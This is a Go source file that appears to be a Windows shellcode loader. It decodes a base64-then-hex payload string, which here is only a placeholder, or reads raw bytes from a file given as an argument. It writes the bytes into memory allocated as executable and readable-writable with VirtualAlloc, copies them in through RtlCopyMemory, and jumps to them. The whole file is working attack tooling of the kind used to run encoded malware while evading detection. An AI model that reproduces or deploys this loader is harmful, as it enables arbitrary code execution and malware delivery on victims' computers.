package main

import (
    "encoding/base64"
    "io/ioutil"
    "os"
    "strconv"
    "syscall"
    "unsafe"
)

// code->hex->base64
var codeHere = "MTIz=="

func base2hex() string {
    var encodeString = codeHere
    decodeBytes, err := base64.StdEncoding.DecodeString(encodeString)
    if err != nil {
    }
    return string(decodeBytes)
}


func hex2byteArr(strInput string)([]byte) {
    strLength := len(strInput)
    hexByte := make([]byte, len(strInput)/2)
    ii := 0
    for i := 0; i < len(strInput); i = i + 2 {
        if strLength != 1 {
            ss := string(strInput[i]) + string(strInput[i+1])
            bt, _ := strconv.ParseInt(ss, 16, 32)
            hexByte[ii] = byte(bt)
            ii = ii + 1;
            strLength = strLength - 2;
        }
    }
    return hexByte;
}



var _code_buf = hex2byteArr(base2hex())

const (
    MEM_COMMIT             = 0x1000
    MEM_RESERVE            = 0x2000
    PAGE_EXECUTE_READWRITE = 0x40
)

var (
    kernel32       = syscall.MustLoadDLL("kernel32.dll")
    ntdll          = syscall.MustLoadDLL("ntdll.dll")
    VirtualAlloc   = kernel32.MustFindProc("VirtualAlloc")
    RtlCopyMemory  = ntdll.MustFindProc("RtlCopyMemory")
)


func checkErr(err error) {
    if err != nil {
        if err.Error() != "The operation completed successfully." {
            println(err.Error())
            os.Exit(1)
        }
    }
}

func main() {
    _code := _code_buf
    if len(os.Args) > 1 {
        codeFileData, err := ioutil.ReadFile(os.Args[1])
        checkErr(err)
        _code = codeFileData
    }

    addr, _, err := VirtualAlloc.Call(0, uintptr(len(_code)), MEM_COMMIT|MEM_RESERVE, PAGE_EXECUTE_READWRITE)
    if addr == 0 {
        checkErr(err)
    }
    _, _, err = RtlCopyMemory.Call(addr, (uintptr)(unsafe.Pointer(&_code[0])), uintptr(len(_code)))
    checkErr(err)
    syscall.Syscall(addr, 0, 0, 0, 0)
}

